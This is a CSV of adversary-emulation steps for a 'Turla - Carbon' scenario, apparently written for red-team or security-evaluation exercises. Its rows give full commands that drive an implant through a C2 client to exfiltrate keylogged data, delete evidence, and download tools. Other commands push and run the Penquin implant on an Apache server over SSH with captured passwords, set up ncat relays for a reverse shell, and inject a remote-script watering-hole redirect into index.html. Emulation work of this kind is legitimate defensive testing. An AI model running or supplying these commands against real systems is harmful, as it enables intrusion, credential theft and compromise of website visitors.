source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
turla_carbon,turla_carbon,Turla - Carbon,unknown,33,4cedd0ef-c802-431d-a4a1-eaf1163543f3,x,x,x,x,Adalwolfa types keylogged data (User),"Xdotools will open powershell on the third target, ssh into the Apache server, type password, and exit ssh session.","rdp_pid=$(pgrep -f #{third.target.user}); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 5; xdotool type ...","rdp_pid=$(pgrep -f #{third.target.user});
rdp_window=$(xdotool search --pid ""$rdp_pid""); 

xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
sleep 5;
xdotool type --window ""$rdp_window"" ""powershell"";
sleep 5;
xdotool key --window ""$rdp_window"" Return;
sleep 5;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
xdotool key --window ""$rdp_window"" Ctrl+Escape;
sleep 5;

xdotool type --window ""$rdp_window"" 'ssh #{third.target.user}@#{apache.server.ip}';
sleep 5;
xdotool key --window ""$rdp_window"" Return;
sleep 5; 
xdotool type --window ""$rdp_window"" 'yes';
sleep 5;
xdotool key --window ""$rdp_window"" Return;
sleep 5;
xdotool key --window ""$rdp_window"" Shift+P;
xdotool type --window ""$rdp_window"" 'assword2';
xdotool key --window ""$rdp_window"" Shift+1;
xdotool key --window ""$rdp_window"" Return;
xdotool type --window ""$rdp_window"" 'exit';
xdotool key --window ""$rdp_window"" Return;
sleep 10;"
turla_carbon,turla_carbon,Turla - Carbon,unknown,34,cefe85b8-d1e5-4077-afac-81a6622f4c66,T1056.001,Collection,8.A.2,Input Capture: Keylogging,Kill keylogger process (Adversary),Task the CARBON-DLL implant on Adalwolfa's workstation to kill the keylogger process.,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 1, ""cmd"": ""taskkill /IM wingtsvcupdt.exe /F""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 1, ""cmd"": ""taskkill /IM wingtsvcupdt.exe /F""}' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,unknown,35,438939c8-e95a-4fbd-b659-06f0b0b72e47,T1056.001,Collection,8.A.2,Input Capture: Keylogging,Exfiltrate keylogged data (Adversary),Task the CARBON-DLL implant to exfiltrate the data written to the keylogger file,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 2, ""cmd"": ""type %temp%\\~DFA512.tmp""}' --task-wait-timeout 200","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 2, ""cmd"": ""type %temp%\\~DFA512.tmp""}' --task-wait-timeout 200"
turla_carbon,turla_carbon,Turla - Carbon,8,36,f8ab9b59-89a7-4c25-90bf-0c2485785a36,8.A.3,Defense Evasion,T1070.004,Indicator Removal on Host: File Deletion,Remove keylogging evidence (Adversary),Task the CARBON-DLL implant to remove the keylogger and keylogger output file.,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 3, ""cmd"": ""del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 3, ""cmd"": ""del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp""}' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,9,37,4d5197fa-4ba7-4bfd-9c91-1697ce0a80a4,9.A.1,Command and Control,T1105,Ingress Tool Transfer,Download Penquin (Adversary),Task the CARBON-DLL implant on Adawolfa's workstation to download Penquin (named tmp504e.tmp).,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 4, ""payload"": ""hsperfdata.zip"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp504e.tmp"", ""cmd"": ""dir C:\\Windows\\Temp\\tmp504e.tmp""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 4, ""payload"": ""hsperfdata.zip"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp504e.tmp"", ""cmd"": ""dir C:\\Windows\\Temp\\tmp504e.tmp""}' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,9,38,d760974d-6466-40b9-8532-b6be578428fc,9.A.2,Command and Control,T1105,Ingress Tool Transfer,Download pscp.exe (Adversary),Task the implant to download pscp.exe,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 5, ""payload"": ""pscp.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\pscp.exe"", ""cmd"": ""move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe &...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 5, ""payload"": ""pscp.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\pscp.exe"", ""cmd"": ""move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe && dir C:\\Windows\\System32\\pscp.exe""}' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,9,39,83a79c7d-721c-44ac-b8d5-d9ba2bc84852,9.A.3,Lateral Movement,T1021.004,Remote Services: SSH,Copy Penquin to Apache web server (Adversary),Task the implant to copy Penquin to the Apache web server using the third target user's credentials.,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 6, ""cmd"": ""echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.serve...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 6, ""cmd"": ""echo y | C:\\Windows\\System32\\pscp.exe -pw #{third.target.password} C:\\Windows\\Temp\\tmp504e.tmp #{third.target.user}@#{apache.server.ip}:/tmp/tmp514f524f""}' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,9,40,4468cc14-8e77-44cd-93de-b892253b3e27,9.A.4,Command and Control,T1105,Ingress Tool Transfer,Download plink.exe (Adversary),Task the implant to download plink.exe,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 7, ""payload"": ""plink.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\plink.exe"", ""cmd"": ""move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.e...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 7, ""payload"": ""plink.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\plink.exe"", ""cmd"": ""move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,9,41,8c6a546b-e03b-4761-b422-8eaf40f59580,9.A.5,Lateral Movement,T1021.004,Remote Services: SSH,Execute Penquin (Adversary),Task the implant to execute Penquin,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 8, ""cmd"": ""(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Win...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 8, ""cmd"": ""(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l #{third.target.user} -pw #{third.target.password} #{apache.server.ip}""}' --task-wait-timeout 200; sleep 60;"
turla_carbon,turla_carbon,Turla - Carbon,9,42,1fe4de9d-d8d3-4188-8a2a-6ff42394400c,9.A.6,Defense Evasion,T1070.004,Indicator Removal on Host: File Deletion,Clean up downloaded files (Adversary),Task the implant to clean up downloaded files,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 9, ""cmd"": ""del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 9, ""cmd"": ""del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60"
turla_carbon,turla_carbon,Turla - Carbon,unknown,43,00a08c4d-d023-4b2a-8244-651f37d23e2c,x,x,x,x,Ncat listener to connect to Penquin's reverse shell (Adversary),Fork a process to set up a Ncat listener for Penquin's reverse shell to connect to,"exec-background bash -c ""mkfifo input_pipe; mkfifo output_pipe; ncat -k -l 12345 0<output_pipe | ncat -lv 8081 1>output_pipe & tail -f input_pipe | ncat localhost 12345 &""","exec-background bash -c ""mkfifo input_pipe; mkfifo output_pipe; ncat -k -l 12345 0<output_pipe | ncat -lv 8081 1>output_pipe & tail -f input_pipe | ncat localhost 12345 &"""
turla_carbon,turla_carbon,Turla - Carbon,10,44,7086ff8c-da64-4b85-a3ee-6157fc0e0a70,10.A.1,Command and Control,T1205,Traffic Signaling,Send magic packet to Apache server (Adversary),Send the magic packet to the Apache server using the `sendPacket.py` utility,sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{attacker.host.ip} --handler_port 8081 --target_ip #{apache.server.ip} --target_port 8080 --payload_type base64,sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{attacker.host.ip} --handler_port 8081 --target_ip #{apache.server.ip} --target_port 8080 --payload_type base64
turla_carbon,turla_carbon,Turla - Carbon,10,45,4b6ed411-6b13-484e-bed6-60b07562d6de,10.A.4,Initial Access,T1189,Drive-By Compromise,Add watering hole redirection (Adversary),Send the command to ncat to add the watering hole redirection to `index.html`,"echo ""echo \""<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = ...","echo ""echo \""<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}</script>\"" >> /var/www/html/index.html"" > input_pipe;
echo exit > input_pipe;
rm input_pipe output_pipe;
ps aux | grep '[n]cat' | awk '{print $2}' | while read line; do kill $line; done"
